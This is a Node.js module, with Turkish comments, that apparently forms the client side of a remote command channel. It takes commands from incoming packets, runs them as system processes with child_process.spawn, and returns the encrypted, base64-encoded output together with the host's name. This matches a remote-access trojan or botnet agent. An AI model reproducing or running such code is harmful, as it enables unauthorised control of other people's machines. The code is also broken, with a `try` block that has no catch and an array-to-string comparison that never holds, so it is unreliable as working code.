module.exports = function(){
    return (function(thisSocket){
        var crypto = require('../crypto');
        var parser = require('./parser');
        var Packet = require('../models/Packet');
        var Promise = require('promise');

        var os = require('os');
        var hostname = os.hostname();

        var sender_id;
        var receiver_id;
        var self = this;
        var command;
        var commandData;

        var processPacket = function(packet, receiver_id, sender_id){
            self.sender_id = sender_id;
            self.receiver_id = receiver_id;

            command = Object.keys(packet.data);
            commandData = packet.data[command];
            console.log("CMD-DATA="+commandData);

            var result = commandHandler(command, commandData, self.receiver_id, self.sender_id);

            return result;

        };

        function commandHandler(command, commandData, receiver_id, sender_id){
            console.log("COMMAND="+command);
            if(command == 'cmd'){

                var result;
                var splitted = commandData.split(' ');
                var firstElement = splitted[0];
                //shift metodu dizinin ilk elemanını diziden çıkartır.
                splitted.shift();

                var args = splitted;

                if(args === firstElement){
                    args = [];
                }

                if(firstElement === 'kill'){
                    try{

                    }
                }

                return new Promise(function(fulfill, reject){
                    //console.log(data);
                    var child = new run_cmd(firstElement, args);
                    child.stdout.setEncoding('utf-8');

                    child.on('error', function(output){
                        var paket = new Packet(receiver_id, sender_id, {
                            output:new Buffer.from("Bir hata meydana geldi.").toString('base64'),
                            name:hostname});

                        var encoded = parser.encode(paket);
                        console.log("ENCODED",encoded);
                        var encrypted = crypto.encrypt(encoded);
                        console.log("ENCRYPTED="+encrypted);
                        fulfill(encrypted);
                    })

                    child.stdout.on('data', function(data){

                        var output=data;
                        console.log('veri gönderiliyor..'+output);
                        paket = new Packet(receiver_id, sender_id, {
                            output:new Buffer.from(output).toString('base64'),
                            name:hostname});
                        console.log("OUTPUT="+output);
                        var encoded = parser.encode(paket);
                        console.log("ENCODED",encoded);
                        var encrypted = crypto.encrypt(encoded);
                        console.log("ENCRYPTED="+encrypted);
                        fulfill(encrypted);

                    });

                })





            }else if(command == 'ack'){
                var paket = new Packet(receiver_id, sender_id, {name:hostname});
                var encoded = parser.encode(paket);
                console.log("ENCODED",encoded);
                var encrypted = crypto.encrypt(encoded);

                return encrypted;
            }else {
                var paket = new Packet(receiver_id, sender_id, 'selam');
                var encoded = parser.encode(paket);
                console.log("ENCODED",encoded);
                var encrypted = crypto.encrypt(encoded);
                return encrypted;
            }

        }


        function run_cmd(cmd, args){
            //spawn, sistem komutlarını çalıştırmamızı sağlayan bir komuttur.
            //child_process modülü bize isletim sistemi fonksiyonlarına erişmemizi sağlar.
            //spawn çağrısıyla dönen child proses return edilir.
            var spawn = require('child_process').spawn;
            console.log("CMDD="+cmd);
            var child_p = spawn(cmd, args);



            return child_p;
        }



        return {
            processPacket:processPacket
        }
    });


}();

